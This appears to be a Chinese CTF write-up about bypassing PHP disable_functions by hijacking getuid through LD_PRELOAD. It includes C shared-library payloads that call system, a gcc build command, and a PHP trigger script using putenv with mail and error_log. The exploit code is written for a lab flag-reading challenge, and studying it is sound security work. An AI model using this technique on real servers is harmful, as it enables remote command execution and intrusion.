---
title: LD_PRELOAD
date: {{ date }}
top: false
cover: false
password:
toc: true
mathjax: true
summary:
tags: [LD_PRELOA,Bypass_disable_function]
categories: LD_PRELOAD
---

# LD_PRELOAD

## 目的

- 通过LD_PRELOAD方法绕过disabled_functions限制

## 思路

绕过disabled_functions的四种手法

1. 攻击后端组件，寻找存在命令注入的web应用常用后端组件，如**ImageMagick**的魔图漏洞、**bash**的破壳漏洞等
2. 寻找未禁用的函数，常见命令执行的函数有**system()**、**exec()**、**shell_exec()**、**passthru()**，偏僻的**popen()**、**proc_open()**、**pcntl_exec()**等等，逐一尝试
3. mod_cgi模式，尝试修改.htaccess，调整请求访问路由，绕过php.ini中的任何限制（让特定扩展名的文件直接和php-cgi通信）
4. 利用环境变量**LD_PRELOAD**劫持系统函数，让外部程序加载恶意*.so，达到执行系统命令的效果

此处只详细说明第四种方法。大致步骤如下

- 生成一个自己的恶意动态链接库文件
- 利用**putenv**设置LD_PRELOAD为自己的恶意动态链接库文件的路径
- 配合php的某个函数去触发自己的恶意动态链接库文件
- RCE并获取flag

这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。

## 什么是LD_PRELOAD

LD_PRELOAD是linux中的一个环境变量，它可以影响程序运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要用作有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或者更好的函数（无需别人的源码），而另一方面，我们也可以向别人的程序中注入恶意程序。

## 利用条件

php.ini配置如下：

```php
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
```

- linux系统
- **putenv**未被禁用
- **mail**或**error_log**至少需要有一个未被禁用
- 存在可写目录，需要上传**.so**文件

## 原理

**mail**或**error_log**函数会调用**sendmail**，而**sendmail**会调用**geteuid**函数，所以将其重写覆盖即可达到目的。

## 题目做法

CTFHub中LD_PRELOAD题目环境给了**readflag**文件，即可直接调用

创建**hack.c**文件

```c
#include <stdlib.h>
#include <stdio.h>

void payload() {
	system("/readflag > /tmp/flag");
}

int getuid(){
    if(getenv("LD_PRELOAD") == NULL)
        return 0;
    unsetenv("LD_PRELOAD");
    payload();
}
```

还有一种优化版本

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__ ((__constructor__)) void xxx (void){
    unsetenv("LD_PRELOAD");
    system("/readflag > /tmp/flag");
}
```

用`gcc -fPIC -shared hack.c -o hack.so`编译出动态链接库**hack.so**文件

上传到`/tmp/`目录下，一般来说`/tmp/`目录都是有读写权限的

调用脚本：

shell.php

```php
<?php
  putenv("LD_PRELOAD=/tmp/hack.so");
  error_log("a",1);
  mail("a@localhost","","","","");
?>
```

利用 LD_PRELOAD 环境变量, 加载 hack.so, 在 hack.so 中执行命令.

我们可以直接利用 hack.so 反弹 shell, 或者将输出重定向到文件当中

> 参考
>
> [警惕UNIX下的LD_PRELOAD环境变量](https://blog.csdn.net/haoel/article/details/1602108)
>
> [LD_PRELOAD](https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/74ASRSoQTq8x2VatRWJR7R.html)
>
> [AntSword-Labs](https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1)

